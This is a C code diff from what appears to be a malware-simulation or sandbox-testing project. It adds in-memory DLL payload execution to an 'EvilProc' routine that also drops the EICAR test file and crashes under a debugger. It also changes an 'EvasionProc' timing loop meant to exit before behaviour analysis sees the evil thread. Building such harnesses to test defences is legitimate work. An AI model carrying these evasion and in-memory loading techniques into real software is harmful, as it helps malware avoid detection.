@@ -7,6 +7,7 @@
 #include "xLibMaliciousApi.h"
 #include "xOsApi.h"
 
+#include "xPayloadApi.h"
 #include "xPayloadManager.h"
 #include "xUtility.h"
 
@@ -33,11 +34,10 @@ static DWORD WINAPI EvasionProc(LPVOID)
 	X_KERNEL32_CALL(LeaveCriticalSection)(&g_sync);
 
 	// Wait for a randomized time which sleeps ~10 min
-	do
+	for (uint32_t ui = 0; ui < 1000 || g_doingEvil; ui++)
 	{
-		X_KERNEL32_CALL(Sleep)(15 * 60 * 1000 + (uint16_t) rand());
+		X_KERNEL32_CALL(Sleep)((uint16_t) rand());
 	}
-	while (g_doingEvil);
 
 	// If wait returns the process exits, thus evading behavior analysis of the evil thread 
 	X_KERNEL32_CALL(ExitProcess)(0);
@@ -86,7 +86,19 @@ static DWORD WINAPI EvilProc(LPVOID)
 	// Do evil. We do this by checking if a debugger is present and also by writing the Eicar test file. Please replace with whatever you think is evil ;-)
 	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();
 
+	// Eicar drop
 	xPayloadManagerDrop(X_MALWARE_FILE_NAME);
+
+	// Memory dll execution
+	uint8_t* payload = NULL;
+
+	uint32_t payloadSize = 0;
+
+	xPayloadManagerGetPayload(&payload, &payloadSize);
+
+	X_PAYLOAD_INIT(payload, payloadSize);
+
+	X_PAYLOAD_CALL(Execute)();
 
 	g_doingEvil = false;
 
